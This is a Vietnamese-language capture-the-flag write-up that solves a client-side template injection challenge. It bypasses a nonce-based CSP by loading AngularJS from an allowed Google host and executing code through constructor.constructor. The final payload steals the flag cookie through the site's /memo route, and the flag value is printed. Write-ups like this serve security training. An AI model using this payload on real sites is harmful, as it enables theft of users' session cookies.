**Client Side Template Injection**
----

<img width="748" height="757" alt="image" src="https://github.com/user-attachments/assets/f7f680d8-8199-4389-b2b2-f1427c102636" />

**I. Phân Tích Mã Nguồn và Xác Định Lỗ Hổng**

- **Xác định Lỗ Hổng:** Tuyến đường /vuln chỉ đơn giản trả về giá trị của tham số param (return param). Lý do: Đây là một lỗ hổng XSS, nơi chúng ta có thể chèn HTML/Script vào trang.
<img width="440" height="153" alt="image" src="https://github.com/user-attachments/assets/e7a5f48e-4bfa-4947-85cf-1bf428fbcd83" />


- **Xác định Rào Cản (CSP):** Kiểm tra header Content-Security-Policy. Chính sách yêu cầu thuộc tính nonce cho các thẻ <script>, ngăn chặn việc sử dụng các payload XSS thông thường như <script>alert(1)</script>.
- **Tìm Kẽ Hở trong CSP:** Mặc dù có nonce, chính sách script-src lại cho phép tải script từ nguồn cụ thể: https://ajax.googleapis.com và cho phép 'unsafe-eval'. Đây là điểm yếu chúng ta sẽ khai thác."
- **Xác định Mục Tiêu:** Flag được lưu dưới dạng cookie tên là flag khi headless browser truy cập trang sau khi submit ở /flag. **Mục tiêu** là sử dụng XSS để đọc và gửi cookie này ra ngoài.

-----
**II.Vượt Qua CSP và Kích Hoạt Template Injection**
- Tải AngularJS
```bash
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
```
- Kích Hoạt AngularJS
```bash
<html ng-app>
```
- Thực Thi Mã JS
```bash
{{ constructor.constructor("...")() }}
```
---
**III. Đánh Cắp Flag**

```bash
location='memo?memo='+document.cookie
```
- Payload cuối cùng
```bash
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script><html ng-app>{{ constructor.constructor("location='memo?memo='+document.cookie")() }}</html>
```
Sau khi nhập toàn bộ payload này vào ô input và nhấn Submit Query kiểm tra tuyến đường /memo nhận được FLAG : **DH{741b1b55cfdae94aaaad6c5f1618d167}**

<img width="574" height="206" alt="image" src="https://github.com/user-attachments/assets/d897b739-9a59-4527-ab77-b34b8c8856e6" />
